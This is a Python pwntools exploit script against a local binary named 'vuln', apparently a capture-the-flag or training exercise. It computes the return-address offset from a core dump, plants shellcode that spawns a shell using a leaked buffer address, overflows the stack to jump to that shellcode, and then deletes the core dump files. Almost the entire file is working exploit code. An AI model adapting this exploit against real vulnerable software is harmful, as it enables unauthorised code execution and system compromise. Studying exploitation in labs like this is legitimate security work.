from pwn import *
import os

def find_rip_offset():
    info("Calculating RIP Offset. . .")

    p = process('./vuln')
    time.sleep(0.5)

    pattern = cyclic(500)
    p.sendline(pattern)
    p.wait()

    try:
        core = p.corefile
        stack = core.rsp

        target_pattern = core.read(stack, 4)
        rip_offset = cyclic_find(target_pattern)

        success(f"RIP offset: {rip_offset}")
        return rip_offset
    except Exception as e:
        print(f"[-] Error: {e}")
        return -1

def exploit_stored_shellexec():
    try:
        rip_offset = find_rip_offset()
        if rip_offset == -1:
            print("[-] RIP offset could not be found!")
            return;

        context.arch = 'amd64'

        info("Generating Payload. . .")
        # prepare shellcode
        shellcode = asm(shellcraft.sh())
        info(f"Shell Code Size: {len(shellcode)}")

        p = process('./vuln')
        time.sleep(0.5)

        info("Generating Payload")

        # store dangerous code for later use
        p.sendline(b'create')
        p.sendline(b'0')
        
        p.recvuntil(b'Package Address: ')
        line = p.recvline().strip()
        leaked_addr = p64(int(line, 16))
        info(f"Leaked Address: {line}")
        p.sendline(shellcode)

        # fill the buffer and replace the RIP with
        # the address to char array with shellcode
        padding = b'A' * rip_offset
        payload = padding + leaked_addr

        info("Sending Payload")
        p.sendline(payload)
        p.interactive()
    except Exception as e:
        print(f"Error: {e}")
        return

def clean_up():
    info("Cleaning up Core Dump Files. . .")
    os.system('rm -f core.*')

def main():
    exploit_stored_shellexec()
    clean_up()

if __name__ == "__main__":
    main()
